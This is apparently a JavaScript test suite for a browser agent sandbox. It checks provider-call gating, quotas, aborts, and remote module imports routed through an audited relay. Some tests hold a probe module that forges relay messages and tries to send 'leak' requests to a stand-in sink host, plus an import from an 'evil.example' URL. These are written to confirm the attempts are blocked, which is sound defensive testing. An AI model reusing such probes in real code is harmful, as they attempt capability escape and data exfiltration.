  it('provider: the capability is DENIED without the caps flag — in-realm throw, no relay', async () => {
    /** @type {any[]} */
    const calls = [];
    const r = await runJob(
      { code: 'try { await peerd.provider.call({ prompt: "x" }); return "REACHED"; } catch (e) { return "blocked:" + e.message; }' },
      { sendToSW: async (type, payload) => { calls.push({ type, payload }); return { ok: true, value: { text: 'y' } }; } },
    );
    expect(calls.some((c) => c.type === 'script/model-call')).toBe(false);
    expect(String(r.value)).toContain('no-provider capability profile');
    expect(r.usedProvider).toBeFalsy();
  });

  it('provider: caps flag without a runId is refused at the host wall (fail closed)', async () => {
    // A provider run must be a LIVE registered run (the SW route verifies the
    // owner-bound runId); the host wall already refuses when the trusted job
    // params are incomplete, even though the realm surface was minted.
    const r = await runJob(
      { code: 'try { await peerd.provider.call({ prompt: "x" }); return "reached"; } catch (e) { return e.message; }',
        caps: { provider: true }, ownerSessionId: 'chat-1' },
      { sendToSW: async () => ({ ok: true, value: { text: 'y' } }) },
    );
    expect(String(r.value)).toContain('disabled');
  });

  it('provider: a quota refusal is a CATCHABLE error the script can degrade on, not a worker kill', async () => {
    const r = await runJob(
      {
        code: [
          'const out = [];',
          'for (const row of ["a", "b"]) {',
          '  try { out.push((await peerd.provider.call({ prompt: row })).text); }',
          '  catch (e) { out.push("skipped: " + e.message); }',
          '}',
          'return out;',
        ].join('\n'),
        caps: { provider: true }, ownerSessionId: 'chat-1', runId: 'run-p2',
      },
      {
        sendToSW: (() => {
          let n = 0;
          return async () => (++n === 1
            ? { ok: true, value: { text: 'ok-1', usage: { inputTokens: 1, outputTokens: 1 } } }
            : { ok: false, error: 'provider quota exceeded: 20 sub-calls per run' });
        })(),
      },
    );
    expect(r.error).toBe(null);
    const v = /** @type {string[]} */ (r.value);
    expect(v[0]).toBe('ok-1');
    expect(v[1]).toContain('provider quota exceeded');
    expect(r.providerCalls).toBe(1);   // only the call that returned usage counts — the quota refusal spent nothing
  });

  it('provider: abortJob(runId) terminates a run mid sub-call — the meter survives', async () => {
    const pending = runJob(
      {
        code: 'await peerd.provider.call({ prompt: "long" }); return "never";',
        caps: { provider: true }, ownerSessionId: 'chat-1', runId: 'run-p-abort', timeoutMs: 30000,
      },
      {
        sendToSW: (type) => new Promise((resolve) => {
          // the sub-call hangs (a live provider stream) until the abort fires
          if (type === 'script/model-call') setTimeout(() => resolve({ ok: false, error: 'aborted' }), 5000);
          else resolve({ ok: true });
        }),
      },
    );
    await new Promise((res) => setTimeout(res, 400));
    abortJob('run-p-abort', 'chat-1');
    const r = await pending;
    expect(r.error).toContain('aborted');
    expect(r.usedProvider).toBe(true);   // the attempt is visible (fencing stays conservative)
    expect(r.providerCalls).toBe(0);     // aborted before any usage came back → nothing counted as spent
  });

  it('actors: abortJob(runId) terminates a live run — partial trace survives', async () => {
    const pending = runJob(
      {
        code: 'await actors.ask("vm-9", "long"); return "never";',
        actors: true, ownerSessionId: 'chat-1', runId: 'run-abort', timeoutMs: 30000,
      },
      {
        sendToSW: (type) => new Promise((resolve) => {
          // the ask hangs (a live actor turn) until the abort fires
          if (type === 'actors/call') setTimeout(() => resolve({ ok: false, error: 'aborted' }), 5000);
          else resolve({ ok: true });
        }),
      },
    );
    // give the worker a beat to issue the ask, then Stop
    await new Promise((res) => setTimeout(res, 400));
    abortJob('run-abort');
    const r = await pending;
    expect(r.error).toContain('aborted');
    expect(r.usedActors).toBe(true);
    expect(/** @type {any[]} */ (r.actorsTrace).length).toBe(1);   // the in-flight ask is on the record
  });
});

// Remote (https:) module imports. Two fences,
// both MEASURED here in a real worker (not argued by construction):
//   1. the resolver path — remote module source rides the audited
//      sw/web-fetch relay and re-enters as a blob, so the worker's module
//      graph never names a third-party URL (the relay stub sees the bytes;
//      the no-egress lanes visibly get nothing);
//   2. the native-loader backstop, measured by spawning a worker whose graph
//      DOES name an https URL and
//      asserting it never executes (see the last test).
describe('headless remote module imports (audited resolver path)', () => {
  /**
   * A sendToSW stub that serves remote module source over the sw/web-fetch
   * route (an unknown URL answers like a denylist refusal) and records calls.
   * @param {Record<string, string>} sources
   * @param {{ type: string, payload: any }[]} calls
   */
  const servingSW = (sources, calls) => async (
    /** @type {string} */ type, /** @type {any} */ payload,
  ) => {
    calls.push({ type, payload });
    if (type === 'sw/web-fetch') {
      const src = sources[payload.url];
      if (src === undefined) return { ok: false, status: 0, error: `denylisted: ${payload.url}` };
      return { ok: true, status: 200, bodyB64: btoa(src) };
    }
    return { ok: true };
  };

  it('a static https import arrives via sw/web-fetch, runs as a blob, and fences the run (usedEgress)', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "import { answer } from 'https://mods.example/util.js';\nreturn answer;" },
      { sendToSW: servingSW({ 'https://mods.example/util.js': 'export const answer = 6 * 7;' }, calls) },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe(42);
    // the module bytes crossed the AUDITED relay, not the native loader
    const fetches = calls.filter((c) => c.type === 'sw/web-fetch');
    expect(fetches.length).toBe(1);
    expect(fetches[0].payload.url).toBe('https://mods.example/util.js');
    expect(fetches[0].payload.method).toBe('GET');
    expect(r.usedEgress).toBe(true);   // module source is untrusted web bytes
    expect(r.usedRemoteModules).toBe(true);
  });

  it('a remote graph loses every ambient capability at the worker and host walls', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const probeSource = `
      export const probe = async () => {
        const attempts = {};
        const forged = [
          { type: 'actor-request', rid: 'forged-actor', args: { task: 'leak' } },
          { type: 'actors-request', rid: 'forged-actors', method: 'list', args: {} },
          { type: 'provider-request', rid: 'forged-provider', args: { prompt: 'leak' } },
          { type: 'fetch-request', rid: 'forged-fetch', url: 'https://sink.example/', method: 'GET' },
          { type: 'page-request', rid: 'forged-page', method: 'snapshot', args: {} },
          { type: 'app-request', rid: 'forged-app', method: 'observe', args: {} },
          { type: 'opfs-request', rid: 'forged-opfs', op: 'read', args: { path: 'canary.txt' } },
          { type: 'distributed-request', rid: 'forged-dweb', method: 'peers' },
          { type: 'site-fetch-request', rid: 'forged-site', pathOrUrl: '/', method: 'GET' },
          { type: 'a2a-request', rid: 'forged-a2a', method: 'peers', args: {} },
        ];
        for (const envelope of forged) postMessage(envelope);
        const tryCall = async (name, fn) => {
          try { await fn(); attempts[name] = 'unexpected success'; }
          catch (error) { attempts[name] = String(error && error.message || error); }
        };
        await tryCall('egress', () => peerd.egress.fetch('https://sink.example/'));
        await tryCall('opfs', () => peerd.self.readFile('canary.txt'));
        await tryCall('subagent', () => peerd.runtime.runAgent({ task: 'leak' }));
        await tryCall('provider', () => peerd.provider.call({ prompt: 'leak' }));
        await tryCall('page', () => peerd.page.snapshot({}));
        await tryCall('dweb', () => peerd.distributed.peers());
        await tryCall('actors', () => actors.list());
        return attempts;
      };
    `;
    const r = await runJob(
      {
        code: "import { probe } from 'https://mods.example/probe.js'; return probe();",
        actors: true,
        caps: { page: true, app: true, egress: true, subagent: true, opfs: true, provider: true },
        ownerSessionId: 'session-remote', runId: 'run-remote',
      },
      { sendToSW: servingSW({ 'https://mods.example/probe.js': probeSource }, calls) },
    );

    expect(r.error).toBe(null);
    expect(r.usedRemoteModules).toBe(true);
    expect(r.usedEgress).toBe(true);
    const attempts = /** @type {Record<string, string>} */ (r.value);
    for (const capability of ['egress', 'opfs', 'subagent', 'provider', 'dweb']) {
      expect(attempts[capability]).toContain('remote_module_capability_blocked');
    }
    // why: V8 and SpiderMonkey phrase missing-property errors differently.
    // The invariant is that neither global exists and no forged relay escapes.
    expect(attempts.page).toContain('undefined');
    expect(attempts.actors).toContain('not defined');
    expect(calls.filter((call) => call.type === 'sw/web-fetch').length).toBe(1);
    expect(calls.some((call) => [
      'actor/spawn', 'actors/call', 'script/model-call', 'page-program/snapshot',
      'app-code/observe', 'app-code/act',
      'dweb/distributed/info', 'site-fetch/call', 'a2a/call',
    ].includes(call.type))).toBe(false);
  });

  it('a remote module’s relative import resolves against ITS url through the same relay', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "import { lib } from 'https://mods.example/pkg/lib.js';\nreturn lib;" },
      { sendToSW: servingSW({
        'https://mods.example/pkg/lib.js': "import { base } from './base.js'; export const lib = base + 1;",
        'https://mods.example/pkg/base.js': 'export const base = 41;',
      }, calls) },
    );
    expect(r.error).toBe(null);
    expect(r.value).toBe(42);
    const urls = calls.filter((c) => c.type === 'sw/web-fetch').map((c) => c.payload.url).sort();
    expect(urls).toEqual(['https://mods.example/pkg/base.js', 'https://mods.example/pkg/lib.js']);
  });

  it('a no-egress caps profile refuses the import at RESOLUTION — zero network calls', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "import 'https://mods.example/util.js';\nreturn 'REACHED';",
        caps: { egress: false } },
      { sendToSW: servingSW({ 'https://mods.example/util.js': 'export const x = 1;' }, calls) },
    );
    expect(String(r.error)).toContain('no network');
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(false);
    expect(r.usedEgress).toBeFalsy();
  });

  it('an a2a run refuses remote imports the same way (mesh-only, provably including code bytes)', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "import 'https://mods.example/util.js';\nreturn 'REACHED';",
        a2a: true, ownerSessionId: 'dweb' },
      { sendToSW: servingSW({ 'https://mods.example/util.js': 'export const x = 1;' }, calls) },
    );
    expect(String(r.error)).toContain('no network');
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(false);
  });

  it('a denylisted module URL fails the run with the resolver’s error, never spawning the worker', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "import 'https://evil.example/mod.js';\nreturn 'REACHED';" },
      { sendToSW: servingSW({}, calls) },
    );
    expect(String(r.error)).toContain('import resolution failed');
    expect(String(r.error)).toContain('denylisted: https://evil.example/mod.js');
    expect(r.value).toBe(undefined);
    // the refusal came from the audited relay — the fetch was ATTEMPTED there
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(true);
  });

  it('a native dynamic import is refused before egress or worker execution', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "const m = await import('https://mods.example/lazy.js');\nreturn m.x;" },
      { sendToSW: servingSW({ 'https://mods.example/lazy.js': 'export const x = 42;' }, calls) },
    );
    expect(r.errorCode).toBe(UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE);
    expect(String(r.error)).toContain('cannot run this import form');
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(false);
    expect(r.usedEgress).toBeFalsy();
  });

  it('peerd.self.import gets the same host-owned refusal without egress', async () => {
    /** @type {{ type: string, payload: any }[]} */
    const calls = [];
    const r = await runJob(
      { code: "return await peerd.self.import('https://mods.example/lazy.js');" },
      { sendToSW: servingSW({ 'https://mods.example/lazy.js': 'export const x = 42;' }, calls) },
    );
    expect(r.errorCode).toBe(UNSUPPORTED_NATIVE_MODULE_IMPORT_CODE);
    expect(String(r.error)).toContain('cannot run this import form');
    expect(calls.some((c) => c.type === 'sw/web-fetch')).toBe(false);
  });

  // Backstop measurement: hand the native loader a module graph that DOES name
  // an https URL, bypassing the resolver on
  // purpose — and record that it never executes. Whichever layer refuses
  // (worker CSP, the network stack), a load failure must surface as the
  // worker error event, never as module execution; this is the regression
  // fence for the backstop behind the resolver path. why an unroutable
  // loopback port: the fence being measured is "no silent success", and a
  // denied/refused fetch and a CSP block both land in the same observable —
  // the error event — without this test ever touching a real network.
  it('the native loader never executes a remote static import from a sealed-worker blob', async () => {
    const src = "import 'https://127.0.0.1:9/never.js';\npostMessage({ type: 'loaded' });";
    const url = URL.createObjectURL(new Blob([src], { type: 'application/javascript' }));
    const worker = new Worker(url, { type: 'module' });
    const outcome = await new Promise((resolve) => {
      const timer = setTimeout(() => resolve('hung'), 8000);
      worker.addEventListener('message', () => { clearTimeout(timer); resolve('EXECUTED'); });
      worker.addEventListener('error', () => { clearTimeout(timer); resolve('load-error'); });
    });
    worker.terminate();
    URL.revokeObjectURL(url);
    expect(outcome).toBe('load-error');
  });
});
